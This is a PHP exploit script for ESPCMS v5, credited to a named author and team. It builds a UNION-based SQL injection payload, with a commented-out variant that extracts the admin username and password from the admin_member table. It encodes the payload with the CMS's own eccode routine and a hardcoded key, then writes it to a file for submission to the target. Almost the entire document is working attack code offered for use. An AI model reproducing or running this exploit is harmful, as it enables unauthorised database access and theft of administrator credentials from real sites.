<?php

//error_reporting(0);
@ini_set('memory_limit','-1');
set_time_limit(0);


echo "
/*======================================================================================
====Name:espcms v5 sql injection exploit  eccode                                    ====
========================================================================================
====Usage:Edit the sql_exp  and  key                                                ====
========================================================================================
====Team:C0dePlay  Team    www.C0dePlay.com                                         ====
========================================================================================
====Author: Yaseng  ��WwW.Yaseng.Me��                                               ====
====Date: 2013-03-27 15:35:00                                                       ====
======================================================================================*/
";


//$sql_exp="  1 and  1=2  union select  1,2,3,(select concat(username,CHAR(0x7c),password)  from  espdemo_admin_member  limit 1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28";

$sql_exp="  1 and  1=2  union select  1,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28";
//$key="dd6e0480f1d7a982463de3b3c9abb218";
$key="95e87f86a2ffde5110e93c2823634927";
file_put_contents("sql_exp.txt",eccode($sql_exp, 'ENCODE',$key));
msg("Generate exploit  succed > sql_exp.txt");


function  msg($str,$type=1){
	
	$str=($type) ? "[+]".$str : "[-]".$str;
	echo $str."\r\n";
	
}



function eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%') {
	$result = '';
	if ($operation == 'ENCODE') {
		for ($i = 0; $i < strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key)) - 1, 1);
			$char = chr(ord($char) + ord($keychar));
			$result.=$char;
		}
		$result = base64_encode($result);
		$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);
	} elseif ($operation == 'DECODE') {
		$data = str_replace(array('-', '_'), array('+', '/'), $string);
		$mod4 = strlen($data) % 4;
		if ($mod4) {
			$data .= substr('====', $mod4);
		}
		$string = base64_decode($data);



		for ($i = 0; $i < strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key)) - 1, 1);
			$char = chr(ord($char) - ord($keychar));
			$result.=$char;
		}
	}
	return $result;
}









?>